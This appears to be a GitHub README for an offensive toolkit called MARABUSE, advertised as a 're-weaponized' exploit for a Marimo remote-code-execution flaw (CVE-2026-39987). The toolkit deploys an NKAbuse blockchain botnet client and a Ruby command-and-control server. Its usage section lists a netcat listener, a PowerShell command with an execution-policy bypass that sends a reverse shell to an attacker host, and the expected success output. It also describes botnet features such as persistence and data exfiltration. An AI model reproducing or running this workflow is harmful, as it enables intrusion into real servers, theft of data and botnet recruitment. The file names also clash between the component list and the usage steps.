<div align="center">

# MARABUSE

<img src="https://readme-typing-svg.demolab.com?font=Orbitron&size=28&pause=1000&color=00F5FF&center=true&vCenter=true&width=700&lines=Researcher:+dontaskmehow;Critical+Marimo+RCE+Research+Framework;For+CVE-+2026-+39987;With+A+Blockchain-+Based+NKAbuse+Payload+WF" alt="MARABUSE banner" />

---

  <img src="https://img.shields.io/badge/MARIMO-RCE%20%26%20NKABUSE-FF4D4D?style=for-the-badge&logo=python&logoColor=white" alt="MARIMO RCE & NKABUSE" />
  
  <h1><strong>MARIMO RCE & NKABUSE EXPLOIT FRAMEWORK</strong></h1>
  <h3><strong>(CVE-2026-39987) - RE-WEAPONIZED - Researcher: dontaskmehow</strong></h3>
  
</div>

>A Re-Weaponized Critical Marimo RCE research framework for CVE-2026-39987 with a blockchain-based NKAbuse payload workflow.

 **Overview**

- This framework has been Re-Weaponized & exploits CVE-2026-39987, a critical Remote Code Execution (RCE) vulnerability in Marimo, a popular Python-based data visualization tool. Attackers actively exploit this flaw to deploy NKAbuse, a blockchain-based botnet malware.

**The framework includes:**

```bash
| Component | Description |
| --- | --- |
| Python Exploit | `marimo_rce.py` — initial RCE exploit |
| JavaScript Payload | `nkabuse_bot.js` — NKAbuse botnet client |
| Ruby C2 Server | `c2Serverv4.rb` — command and control server for botnet management |
```
---

**JavaScript Payload:**

`nkabuse_bot.js`

- Deployed by `marimo_rce.py` to create a blockchain-based botnet.)

---

**Ruby C2 Server:**

`c2Serverv4.rb`

Run with: 

```bash
ruby c2Serverv4.rb <lport>
```
---

**Exploit Workflow**

- Run the Python Exploit
  
   `marimo_rce.py`

- Exploits CVE-2026-39987 to gain RCE on the target.
- Deploys a reverse shell and the NKAbuse botnet client.
  
   `nkabuse_bot.js`

---

**NKAbuse Botnet Client** 

`nkabuse_bot.js`

- Connects to the Ethereum blockchain.
- Polls the NKAbuse smart contract for commands.
- Executes commands and submits results back to the blockchain.

---

**C2 Server** 

`c2Serverv4.rb`

- Manages connected bots.
- Dispatches commands via the blockchain.
- Receives results from bots.

---

**Exploit Details**

**1.** CVE-2026-39987 (Marimo RCE) - RE-WEAPONIZED

- Vulnerability: Unauthenticated remote code execution in Marimo (<1.2.4).
- Impact: Full system compromise, deployment of NKAbuse malware.
- Exploitation: Sends a crafted JSON payload to `/api/v1/execute` to execute arbitrary PowerShell code.

**2.** NKAbuse Malware

- Blockchain-Based C2: Uses Ethereum smart contracts for command and control.
- Persistence: Runs as a background process, surviving reboots.
- Capabilities:
  - Remote command execution.
  - Data exfiltration.
  - Botnet coordination.

---

***Usage Instructions***

**1.** Set Up Listener

```powershell
# On your attacker machine:
nc -lvnp 4444
```

**2.** Execute Exploit

```powershell
# On your attacker machine:
powershell -ep bypass -f neo_marimo_rce.ps1 -TargetUrl "http://vulnerable-target.com" -LHOST "your_ip" -LPORT 4444
```

**3.** Expected Output

```text
[+] Exploit successful! Reverse shell and NKAbuse deployed.
[+] Listener should receive connection from http://vulnerable-target.com
```

---

<div align="center">

<img src="https://readme-typing-svg.demolab.com?font=Orbitron&size=28&pause=1000&color=00F5FF&center=true&vCenter=true&width=700&lines=Researcher:+dontaskmehow;Critical+Marimo+RCE+Research+Framework;For+CVE-+2026-+39987;With+A+Blockchain-+Based+NKAbuse+Payload+WF" alt="MARABUSE banner" />

</div>
